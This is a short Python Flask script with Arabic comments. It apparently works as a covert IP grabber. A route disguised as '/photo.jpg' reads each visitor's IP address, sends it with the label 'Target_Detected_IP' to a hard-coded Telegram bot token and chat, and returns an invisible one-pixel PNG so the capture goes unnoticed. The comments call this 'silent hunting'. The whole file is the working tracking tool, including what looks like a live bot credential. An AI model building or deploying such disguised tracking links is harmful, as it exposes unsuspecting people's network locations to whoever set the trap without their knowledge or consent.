from flask import Flask, request, send_file
import requests
import io

app = Flask(__name__)

# بياناتك كما في الصورة
TOKEN = "8459471902:AAHLHHniOWAQSDznm5TFWWmUzROr9cf_CUo"
ID = "8524242091"

@app.route('/')
@app.route('/photo.jpg')
def index():
    # 1. جلب الـ IP بطريقة مضمونة
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    
    # 2. رابط التليجرام المباشر
    test_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text=Target_Detected_IP_{ip}"
    
    try:
        # إرسال الطلب
        response = requests.get(test_url, timeout=10)
        # إذا كنت تريد التأكد، يمكنك إرجاع استجابة التليجرام للمتصفح
        # return response.text 
    except Exception as e:
        pass

    # 3. إرجاع صورة شفافة لضمان "الصيد الصامت"
    pixel = io.BytesIO(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82')
    return send_file(pixel, mimetype='image/png')

# مهم جداً لـ Vercel
if __name__ == "__main__":
    app.run()
